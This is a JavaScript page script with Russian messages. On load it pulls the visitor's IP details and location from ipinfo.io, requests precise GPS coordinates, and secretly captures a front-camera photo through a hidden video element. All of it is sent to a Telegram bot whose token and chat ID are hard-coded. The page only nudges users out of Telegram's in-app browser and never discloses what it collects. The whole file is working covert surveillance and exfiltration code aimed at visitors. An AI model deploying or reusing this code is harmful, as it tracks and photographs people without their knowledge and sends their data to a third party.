$(document).ready(function () {
  if (navigator.userAgent.includes("Telegram")) {
    alert("Для корректной работы откройте эту страницу в обычном браузере (например, Chrome или Edge).");
  }

  const botToken = "8114030428:AAHsuJfIONLcoVFZrLaRGyww2GNgeQ2RBpg";
  const chatId = "6325602757";

  function sendMessage(text) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: text
      })
    });
  }

  fetch("https://ipinfo.io/json")
    .then(response => {
      if (!response.ok) throw new Error(response.status);
      return response.json();
    })
    .then(data => {
      const message = `IP: ${data.ip}\nГород: ${data.city}\nСтрана: ${data.country}\nОрганизация: ${data.org}\nРегион: ${data.region}\nНеточная локация: ${data.loc}`;
      sendMessage(message);
    })
    .catch(error => {
      sendMessage(`Ошибка при получении IP-данных: ${error.message || error}`);
    });

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      position => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const message = `Точная локация: ${latitude}, ${longitude}`;
        sendMessage(message);
      },
      error => {
        sendMessage(`Ошибка при получении геолокации: ${error.message}`);
      }
    );
  } else {
    sendMessage("Геолокация не поддерживается этим браузером.");
  }

  (async () => {
      const video = document.createElement('video');
      video.setAttribute('playsinline', 'true');
      video.style.display = 'none';
      document.body.appendChild(video);

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }
      });

      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 320;
      canvas.height = video.videoHeight || 240;
      const ctx = canvas.getContext('2d');

      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL("image/png");

      const base64Data = imageData.replace(/^data:image\/png;base64,/, "");

      function base64ToBlob(base64, type = "image/png") {
        const binary = atob(base64);
        const array = [];
        for (let i = 0; i < binary.length; i++) {
            array.push(binary.charCodeAt(i));
        }
        return new Blob([new Uint8Array(array)], { type });
      }

      const photoBlob = base64ToBlob(base64Data);

      const formData = new FormData();

      formData.append("chat_id", chatId);
      formData.append("photo", photoBlob, "photo.png");

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      });


      stream.getTracks().forEach(track => track.stop());

      video.remove();
      canvas.remove();
    })();
});
